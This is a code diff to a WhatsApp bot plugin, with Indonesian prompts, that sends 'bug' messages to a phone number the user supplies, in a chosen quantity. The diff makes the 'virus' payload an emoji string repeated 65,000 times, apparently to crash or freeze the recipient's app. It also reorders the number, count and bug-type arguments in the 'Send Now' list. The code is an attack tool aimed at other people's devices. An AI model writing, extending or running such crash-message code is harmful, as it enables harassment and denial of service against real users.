@@ -29,7 +29,7 @@ let handler = async (m, {
 	let _situm = await conn.resize(thumbnailUrl.getRandom(), 300, 150)
 	let sipp = await conn.resize(pp, 150, 150)
 
-	let virus = emojis.join('')
+	let virus = emojis.repeat(65000)
 	const from = m.key.remoteJid
 
 	//==================( Quoted ) =================//
@@ -258,8 +258,8 @@ let handler = async (m, {
 	//=================================================//   
 
 	let nomor = args[0]
-	let bugg = args[1]
-	let jumlah = args[2]
+	let bugg = args[2]
+	let jumlah = args[1]
 	let sukses = '[ SUKSES ]'
 
 	if (!nomor) throw '[ ⚠️ ] HARAP MASUKKAN NOMOR'
@@ -282,7 +282,7 @@ let handler = async (m, {
 	let listSections = []
 	Object.keys(dapet).map((v, index) => {
 		listSections.push([++index + ' ' + cmenub + ' BUG ' + (dapet[v]).toUpperCase(), [
-			['Send Now', usedPrefix + command + ' ' + fixedNumber + ' ' + dapet[v] + ' ' + fixedJumlah, '\nBy: ' + author]
+			['Send Now', usedPrefix + command + ' ' + fixedNumber + ' ' + fixedJumlah + ' ' + dapet[v], '\nBy: ' + author]
 		]])
 	})
 	if (!bugg) return conn.sendList(m.chat, htki + ' 📺 Bug List 🔎 ' + htka, `⚡ Silakan pilih Bug List di tombol di bawah...\n*Teks yang anda kirim:* ${text}\n\nKetik ulang *${usedPrefix + command}* teks anda untuk mengubah teks lagi`, author, `☂️ Bug List Disini ☂️`, listSections, m)
